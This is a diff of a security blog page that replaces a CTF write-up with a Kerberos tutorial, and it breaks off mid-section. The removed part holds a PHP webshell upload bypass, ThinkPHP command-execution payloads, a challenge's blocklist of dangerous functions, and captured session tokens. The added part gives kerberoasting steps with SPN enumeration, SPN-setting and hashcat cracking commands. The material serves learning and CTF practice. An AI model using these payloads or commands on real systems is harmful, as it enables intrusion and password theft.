@@ -17,27 +17,27 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
   <meta name="theme-color" content="#f9fafb">
-  <title>蜀道山2024wp - Sauy's corner</title>
+  <title>Kerberos协议及其攻击手法 - Sauy's corner</title>
 
   
-    <meta name="description" content="奶龙牌WAF拿到附件 不准上传后缀为ph和hta的文件 并且对文件大小有限制 代码关键处:  move_uploaded_file 函数定义和用法：12move_uploaded_file() 函数把上传的文件移动到新位置。如果成功该函数返回 TRUE，如果失败则返回 FALSE。  语法：123move_uploaded_file(file,newloc)file:必需。规定要移动的文件。new">
+    <meta name="description" content="Kerberos协议在Kerberos协议中主要是有三个角色：  访问服务的客户端 Client 提供服务的服务端 Server #而Client和Server分别是域内的客户和服务 密钥分发中心KDC（Kerberos协议的核心组成） #KDC 服务会默认安装在域控中  KDC中分成两个部分：  身份验证服务AS：验证Client的身份，验证通过之后，AS就会发放TGT票据给Client。 票据">
 <meta property="og:type" content="article">
-<meta property="og:title" content="蜀道山2024wp">
-<meta property="og:url" content="http://example.com/2025/04/10/%E8%9C%80%E9%81%93%E5%B1%B12024-wp/">
+<meta property="og:title" content="Kerberos协议及其攻击手法">
+<meta property="og:url" content="http://example.com/2026/04/06/Kerberos%E5%8D%8F%E8%AE%AE%E5%8F%8A%E5%85%B6%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/">
 <meta property="og:site_name" content="Sauy&#39;s corner">
-<meta property="og:description" content="奶龙牌WAF拿到附件 不准上传后缀为ph和hta的文件 并且对文件大小有限制 代码关键处:  move_uploaded_file 函数定义和用法：12move_uploaded_file() 函数把上传的文件移动到新位置。如果成功该函数返回 TRUE，如果失败则返回 FALSE。  语法：123move_uploaded_file(file,newloc)file:必需。规定要移动的文件。new">
+<meta property="og:description" content="Kerberos协议在Kerberos协议中主要是有三个角色：  访问服务的客户端 Client 提供服务的服务端 Server #而Client和Server分别是域内的客户和服务 密钥分发中心KDC（Kerberos协议的核心组成） #KDC 服务会默认安装在域控中  KDC中分成两个部分：  身份验证服务AS：验证Client的身份，验证通过之后，AS就会发放TGT票据给Client。 票据">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/sauy.jpg">
-<meta property="article:published_time" content="2025-04-10T08:10:58.000Z">
-<meta property="article:modified_time" content="2025-09-15T07:56:26.410Z">
+<meta property="article:published_time" content="2026-04-06T13:10:58.000Z">
+<meta property="article:modified_time" content="2026-04-09T02:25:53.412Z">
 <meta property="article:author" content="Sauy">
-<meta property="article:tag" content="CTF-wp">
+<meta property="article:tag" content="-域渗透">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/images/sauy.jpg">
   
   
   
-  <meta name="keywords" content="CTF-wp">
+  <meta name="keywords" content="-域渗透">
 
   <!-- feed -->
   
@@ -51,7 +51,7 @@
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Sauy","sameAs":[],"image":"/images/sauy.jpg"},"dateCreated":"2025-04-10T16:10:58+08:00","dateModified":"2025-09-15T15:56:26+08:00","datePublished":"2025-04-10T16:10:58+08:00","description":"","headline":"蜀道山2024wp","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/04/10/%E8%9C%80%E9%81%93%E5%B1%B12024-wp/"},"publisher":{"@type":"Organization","name":"Sauy","sameAs":[],"image":"/images/sauy.jpg","logo":{"@type":"ImageObject","url":"/images/sauy.jpg"}},"url":"http://example.com/2025/04/10/%E8%9C%80%E9%81%93%E5%B1%B12024-wp/","keywords":"CTF-wp","thumbnailUrl":"/images/3.JPG","image":1}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Sauy","sameAs":[],"image":"/images/sauy.jpg"},"dateCreated":"2026-04-06T21:10:58+08:00","dateModified":"2026-04-09T10:25:53+08:00","datePublished":"2026-04-06T21:10:58+08:00","description":"","headline":"Kerberos协议及其攻击手法","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2026/04/06/Kerberos%E5%8D%8F%E8%AE%AE%E5%8F%8A%E5%85%B6%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/"},"publisher":{"@type":"Organization","name":"Sauy","sameAs":[],"image":"/images/sauy.jpg","logo":{"@type":"ImageObject","url":"/images/sauy.jpg"}},"url":"http://example.com/2026/04/06/Kerberos%E5%8D%8F%E8%AE%AE%E5%8F%8A%E5%85%B6%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/","keywords":"-域渗透","thumbnailUrl":"/images/24.JPG","image":1}</script>
   
 </head>
 <body>
@@ -83,52 +83,169 @@
   <div class="content">
     <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a>
 <span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a></div>
-<div class="flex-row" id="post-meta"><span class="text created">Posted on: <time datetime="2025-04-10T08:10:58.000Z">2025-04-10</time></span><span class="sep updated"></span><span class="text updated">Updated on: <time datetime="2025-09-15T07:56:26.410Z">2025-09-15</time></span></div></div></div>
+<div class="flex-row" id="post-meta"><span class="text created">Posted on: <time datetime="2026-04-06T13:10:58.000Z">2026-04-06</time></span><span class="sep updated"></span><span class="text updated">Updated on: <time datetime="2026-04-09T02:25:53.412Z">2026-04-09</time></span></div></div></div>
     
     <div class="bottom only-title">
       
       <div class="text-area">
-        <h1 class="text title"><span>蜀道山2024wp</span></h1>
+        <h1 class="text title"><span>Kerberos协议及其攻击手法</span></h1>
         
       </div>
     </div>
     
   </div>
-  </div><article class="md-text content"><h2 id="奶龙牌WAF"><a href="#奶龙牌WAF" class="headerlink" title="奶龙牌WAF"></a>奶龙牌WAF</h2><p>拿到附件 不准上传后缀为ph和hta的文件 并且对文件大小有限制</p>
-<p>代码关键处:</p>
-<p><img src="/images/image-20250411171529202.png" alt="image-20250411171529202"></p>
-<h3 id="move-uploaded-file-函数"><a href="#move-uploaded-file-函数" class="headerlink" title="move_uploaded_file 函数"></a>move_uploaded_file 函数</h3><h4 id="定义和用法："><a href="#定义和用法：" class="headerlink" title="定义和用法："></a>定义和用法：</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file() 函数把上传的文件移动到新位置。</span><br><span class="line">如果成功该函数返回 TRUE，如果失败则返回 FALSE。</span><br></pre></td></tr></table></figure>
+  </div><article class="md-text content"><h1 id="Kerberos协议"><a href="#Kerberos协议" class="headerlink" title="Kerberos协议"></a>Kerberos协议</h1><p>在Kerberos协议中主要是有三个角色：</p>
+<ul>
+<li>访问服务的客户端 Client</li>
+<li>提供服务的服务端 Server #而Client和Server分别是域内的客户和服务</li>
+<li>密钥分发中心KDC（Kerberos协议的核心组成） #KDC 服务会默认安装在域控中</li>
+</ul>
+<p>KDC中分成两个部分：</p>
+<ul>
+<li>身份验证服务AS：验证Client的身份，验证通过之后，AS就会发放TGT票据给Client。</li>
+<li>票据授予服务TGS：当Client获取的TGT票据后，TGS会给Clinet换取访问Server端的ST服务票据。</li>
+</ul>
+<h2 id="Client和AS-Authentication-Service-交互"><a href="#Client和AS-Authentication-Service-交互" class="headerlink" title="Client和AS(Authentication Service)交互"></a>Client和AS(Authentication Service)交互</h2><p><strong>step1:</strong> client向KDC的AS认证服务请求TGT票据</p>
+<p>**step2:**客户端通过AS认证后，KDC会给client发放TGT票据</p>
+<h2 id="Client-与-TGS-的交互"><a href="#Client-与-TGS-的交互" class="headerlink" title="Client 与 TGS 的交互"></a>Client 与 TGS 的交互</h2><p>**step3:**client带上TGT票据，向TGS服务请求ST服务票据</p>
+<p>**step4:**client通过TGS认证后，TGS将会给客户端发放ST服务票据</p>
+<h2 id="Client-与-Server-的交互"><a href="#Client-与-Server-的交互" class="headerlink" title="Client 与 Server 的交互"></a>Client 与 Server 的交互</h2><p>**step5:**client使用ST服务票据向appliacation server请求服务</p>
+<p>**step6:**PAC校验，服务端拿到PAC询问KDC客户端是否有权限，KDC将客户端的权限信息返回给服务端，判断客户端是否有权限访问该服务，并把结果返回给客户端</p>
+<p>流程图：</p>
+<p><img src="https://picui.ogmua.cn/s1/2026/03/19/69bbe55513881.webp" alt="image-20260318222855551"> </p>
+<p>关键名词</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">DC 域控制器 Domain Controller</span><br><span class="line"></span><br><span class="line">KDC 密钥分发中心 Key Distribution Center</span><br><span class="line"></span><br><span class="line">AS 身份验证服务 Authentication Service</span><br><span class="line"></span><br><span class="line">TGS 票据授予服务 Ticket Granting Service</span><br><span class="line"></span><br><span class="line">TGT 认证票据 Ticket Granting Ticket</span><br><span class="line"></span><br><span class="line">ST 服务票据 Service Ticket</span><br><span class="line"></span><br><span class="line">PAC 特权属性证书 Privilege Attribute Certificate</span><br><span class="line"></span><br><span class="line">AD 账户数据库 Account Database（存储所有Client的白名单）</span><br><span class="line"></span><br><span class="line">krbtgt账户（KDC的服务账户）</span><br></pre></td></tr></table></figure>
 
-<h4 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file(file,newloc)</span><br><span class="line">file:必需。规定要移动的文件。</span><br><span class="line">newloc:必需。规定文件的新位置。</span><br></pre></td></tr></table></figure>
+<p><img src="https://image.3001.net/images/20230707/1688740789_64a823b58c501523cd85f.png" alt="img"></p>
+<h2 id="kerberoasting攻击"><a href="#kerberoasting攻击" class="headerlink" title="kerberoasting攻击"></a>kerberoasting攻击</h2><h3 id="SPN（service-principal-name）服务主体名称"><a href="#SPN（service-principal-name）服务主体名称" class="headerlink" title="SPN（service principal name）服务主体名称"></a>SPN（service principal name）服务主体名称</h3><p>Windows域环境中用于标识服务或应用程序的唯一标识符，kerberos认证使用SPN来关联服务和运行的应用程序</p>
+<p>格式</p>
+<p><img src="https://picui.ogmua.cn/s1/2026/03/19/69bbe553b3e90.webp" alt="image-20260318211348104"></p>
+<h3 id="kerberoasting攻击-1"><a href="#kerberoasting攻击-1" class="headerlink" title="kerberoasting攻击"></a>kerberoasting攻击</h3><p><code>Kerberoasting的前提：服务SPN必须注册在域用户账户下，因为机器账户的密码是随机生成的，基本爆破不了</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">服务票据会使用服务账户的哈希进行加密，这样一来，Windows域中任何经过身份验证的用户都可以从 TGS 处请求 ST 服务票据。由于服务票证是用链接到请求 SPN 的帐户的哈希加密的，所以攻击者可以离线破解这个加密块，恢复帐户的明文密码</span><br></pre></td></tr></table></figure>
 
-<h4 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注释：该函数仅用于通过 HTTP POST 上传的文件。</span><br><span class="line">注释：如果目标文件已经存在，将会被覆盖。</span><br></pre></td></tr></table></figure>
+<p><img src="https://picui.ogmua.cn/s1/2026/03/20/69bcdc3bb174f.webp" alt="image-20260320133447236.png"></p>
+<p>客户端请求一个服务票据并离线破解服务账户的密码hash</p>
+<p><img src="https://picui.ogmua.cn/s1/2026/03/19/69bbe554d39a2.webp" alt="image-20260318215315260"></p>
+<h4 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h4><h3 id="枚举SPN"><a href="#枚举SPN" class="headerlink" title="枚举SPN"></a><strong>枚举SPN</strong></h3><p>SetSPN</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -Q */*    # 查看当前域内所有的 SPNsetspn -T whoamianony.org -Q */*    # 查看指定域 whoamianony.org 注册的SPN, 如果指定域不存在, 则默认切换到查找本域的 SPNsetspn -L &lt;username&gt;/&lt;hostname&gt;    # 查找指定用户/主机名注册的 SPN</span><br></pre></td></tr></table></figure>
 
-<h3 id="题目做法"><a href="#题目做法" class="headerlink" title="题目做法:"></a>题目做法:</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当move_uploaded_file函数参数可控时，可以尝试/.绕过，因为该函数会忽略掉文件末尾的/.，所以可以构造save_path=1.php/.,这样file_ext值就为空，就能绕过黑名单，而move_uploaded_file函数忽略文件末尾的/.可以实现保存文件为.php</span><br></pre></td></tr></table></figure>
+<p>使用 GetUserSPNs.ps1 脚本</p>
+<p>•项目地址：<a target="_blank" rel="noopener" href="https://github.com/nidem/kerberoast.git">https://github.com/nidem/kerberoast.git</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\GetUserSPNs.ps1</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20250411172003589.png" alt="image-20250411172003589"></p>
-<p>这段代码代表只对前5000字节进行校验，意思是5000之后我们就可以传入危险内容(木马)。</p>
-<p>使用<code>print(&#39;a&#39;*2000000+&#39;&lt;?php eval($_POST[1]);?&gt;&#39;)</code></p>
-<p>上传文件即可</p>
-<p>数据包构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST /?name=1.php/. HTTP/1.1</span><br><span class="line">Host: gz.imxbt.cn:20801</span><br><span class="line">Content-Length: 1048752</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36</span><br><span class="line">Origin: http://gz.imxbt.cn:20801</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycXLzLLazg0AJNoVA</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://gz.imxbt.cn:20801/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,zh-TW;q=0.7</span><br><span class="line">Cookie: PHPSESSID=8177754fd454ad57569dea76792994c9; name=&quot;!4SSvdzbD0UYv84Lnpmm1VLtPBddCrvhgQOLkNQbhjek=?gAWVGQAAAAAAAABdlCiMBG5hbWWUfZRoAYwFZ3Vlc3SUc2Uu&quot;; GZCTF_Token=CfDJ8MKySZ_mlO1BrUTiopFb3pr4sMLMFDp7VLwqIHHQ787J8MU9o7kzKDQgSGH3aUSAFreJelz-xjNcVon1NvCY9iAKz8ktIq-qB4r2jQSniDqdjks-AlNc7Rkw9ROQ3vAa9e0N-iumHmUWe1UcvM30oD4C_p5X2rfkyF4zaLlPcJte51OO6suesKAsKpiTzQ1RvmbX-oqD9hVQaRz0jBi9xFJ7fpCIh2-_Y8UzrQ8TgMQRwpHxaUjX6TUPWl2iaCoFCXNG5RSUU5JVX6JeXurix40S_LdkKSdgdmEXKkw1XNLb5v1YDumTpaGciQGUIVoxHZRwlEtgQ5eR3pq8O1_vm4yODQYq4Y0RPvc2MoJVYLZgX1u-EsroGJdBXAMr09bPEkPJYYerhs1QlP5t2Y8A076GE8Cv82ugOHeNStUNFBf_XQwunbSKJt0FaUtv0SdEu-EKn79ZcAd4m_Ui2-DypcJ6NW7yQrVoC31ElAZuLxFCuVZP4Jw_hZxvAhETL4Pm3Jbx0XR1Dv_Eyjirco1Gtowu44qH972w0qN2sbR2iTwatubxFs39PNNj6dBeZj3MsqihIS5JgY4aY2yAiSLgV586D0zNxFepVQR6_qSzYVX61OIiXKjnRACYg6F6neFGC7YwlYz260chM2RECVTWEqQOdR02WQ6HRcoMqFiFMMXchvAX7rW8t3RJ7T6dF_eel5le5oHsYhoxevoMfddEVM8</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarycXLzLLazg0AJNoVA</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;1.php/.&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&quot;2000000个a&quot;+&lt;?php eval($_POST[1]);?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarycXLzLLazg0AJNoVA--</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>使用 PowerView.ps1 脚本</p>
+<p>•项目地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/">https://github.com/PowerShellMafia/PowerSploit/</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1Get-NetUser -SPN</span><br></pre></td></tr></table></figure>
 
-<p>上传连接蚁剑</p>
-<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20250411175902900.png" alt="image-20250411175902900"></p>
-<h2 id="恶意代码检测器"><a href="#恶意代码检测器" class="headerlink" title="恶意代码检测器"></a>恶意代码检测器</h2><p>进去就是个检测器 扫描路径发现<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> 下载得到源码 index.php里有检测code的源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$code</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[\&quot;;&#x27;%\\\\]/&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/openlog|syslog|readlink|mail|symlink|popen|passthru|scandir|show_source|assert|fwrite|curl|php|system|eval|cookie|assert|new|session|str|source|passthru|exec|request|require|include|link|base|exec|reverse|open|popen|getallheaders|next|prev|f|conv|ch|hex|end|ord|post|get|array_reverse|\~|\`|\#|\%|\^|\&amp;|\*|\-|\+|\[|\]|\_|\&lt;|\&gt;|\/|\?|\\\\/is&#x27;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$attack_log_file</span> = <span class="string">&#x27;/tmp/attack.log&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$attack_log_file</span>)) &#123;</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$attack_log_file</span>, <span class="string">&#x27;$attack_word=\&#x27;&#x27;</span>.<span class="variable">$code</span>.<span class="string">&#x27;\&#x27;;&#x27;</span>.<span class="string">&quot;\r\n&quot;</span>,FILE_APPEND);</span><br><span class="line">                <span class="keyword">require_once</span>(<span class="string">&#x27;/tmp/attack.log&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$attack_log_file</span>, <span class="string">&#x27;&lt;&#x27;</span>.<span class="string">&#x27;?&#x27;</span>.<span class="string">&#x27;php&#x27;</span>.<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$attack_word</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;检测到危险代码: &#x27;</span>.<span class="variable">$attack_word</span>.<span class="string">&#x27;！！！&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            	  <span class="keyword">echo</span> <span class="string">&#x27;欢迎使用gxngxngxn的恶意代码检测器！！！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$safe_log_file</span> = <span class="string">&#x27;/tmp/safe.log&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$safe_log_file</span>)) &#123;</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$safe_log_file</span>, <span class="string">&#x27;$safe_word=&quot;&#x27;</span>.<span class="variable">$code</span>.<span class="string">&#x27;&quot;;&#x27;</span>.<span class="string">&quot;\r\n&quot;</span>,FILE_APPEND);</span><br><span class="line">                <span class="keyword">require_once</span>(<span class="string">&#x27;/tmp/safe.log&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$safe_log_file</span>, <span class="string">&#x27;&lt;&#x27;</span>.<span class="string">&#x27;?&#x27;</span>.<span class="string">&#x27;php&#x27;</span>.<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$safe_word</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;未检测到危险代码，&#x27;</span>.<span class="variable">$safe_word</span>.<span class="string">&#x27;，非常安全&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            	  <span class="keyword">echo</span> <span class="string">&#x27;欢迎使用gxngxngxn的恶意代码检测器！！！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="导出票据获取hash："><a href="#导出票据获取hash：" class="headerlink" title="导出票据获取hash："></a>导出票据获取hash：</h4><p>mimikatz可以导出票据 或者使用rebeus可以直接拿到票据里的hash（前提都是你可以RDPWindows桌面这样 这两工具方便点</p>
+<p>如果只有ip用户密码 那可以使用targetedKerberoast或者impacket-GetUserSPNs 模块</p>
+<h4 id="爆破hash："><a href="#爆破hash：" class="headerlink" title="爆破hash："></a>爆破hash：</h4><p>最后拿到的hash使用hachcat或者john爆破就行</p>
+<p>这样我们就可以拿到指定用户的密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
 
-<p>并且不难发现这是thinkphp的网站 那么肯定是和tp有关的特性 我自己做的时候不知道 后面看wp才知道</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在 ThinkPHP（TP）框架中，$&#123;&#125; 符号常用于模板引擎的表达式解析。在模板中，$&#123;&#125; 可以嵌入 PHP 表达式，这些表达式会被解析并执行。它通常用于输出数据或在模板中执行一些简单的 PHP 逻辑。</span><br></pre></td></tr></table></figure>
+<h2 id="Targeted-kerberoasting"><a href="#Targeted-kerberoasting" class="headerlink" title="Targeted kerberoasting"></a>Targeted kerberoasting</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果发现对某个AD用户有GeneriteWrite或GeneriteAll权限，则可以给账户设置一个SPN,然后kerberoast用户账户，破解密码hash。</span><br></pre></td></tr></table></figure>
 
-<p>可以使用${}</p>
-<p>1.使用input函数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">input() 是 ThinkPHP 6 中的一个函数。它是 ThinkPHP 框架提供的一个用来获取请求数据（如 GET、POST 或 PUT 请求中的参数）的函数。</span><br></pre></td></tr></table></figure>
+<p>攻击步骤</p>
+<h3 id="枚举ACL"><a href="#枚举ACL" class="headerlink" title="枚举ACL"></a>枚举ACL</h3><p>寻找拥有对其有GeneriteWrite或GeneriteAll权限的用户</p>
+<p>使用Find-InterestingDomainAcl（powershell）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Find-InterestingDomainAcl -ResolveGUIDs | ?&#123;$_.SecurityIdentifier -match &quot;rto&quot;&#125;</span><br></pre></td></tr></table></figure>
 
-<p><code>code=$&#123;input(0)(input(1))&#125;&amp;0=system&amp;1=cat+/f*</code></p>
-<p>2.使用unsort</p>
-<p><code>code=$&#123;usort((ge.tallheaders)(),sys.tem)&#125;</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /public/index.php HTTP/1.1</span><br><span class="line">Host: gz.imxbt.cn:20012</span><br><span class="line">aaa: ls</span><br><span class="line">Content-Length: 41</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: http://gz.imxbt.cn:20012</span><br><span class="line">Referer: http://gz.imxbt.cn:20012/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: csrftoken=OaW6pVSwc7zWaWovIsxPogO3TESlFCY0</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+<p>或者bloodhound探测域内环境也可以看到</p>
+<h3 id="设置SPN"><a href="#设置SPN" class="headerlink" title="设置SPN"></a>设置SPN</h3><p>本地</p>
+<p><strong>windows</strong>原生工具</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -S &quot;service/target-hostname&quot; TargetUser</span><br></pre></td></tr></table></figure>
 
+<p><strong>PowerView</strong> 脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-DomainObject -Identity &quot;TargetUser&quot; -Set @&#123;serviceprincipalname=&quot;HTTP/fake.service.com&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>远程连接</strong></p>
+<p><strong>impacket</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-addspn -u &#x27;domain.local\YourUser&#x27; -p &#x27;YourPass&#x27; -dc-ip 10.10.10.10 -additional &quot;MSSQLSvc/target-user.domain.local:1433&quot; &quot;TargetUser&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>bloodyAD</strong> </p>
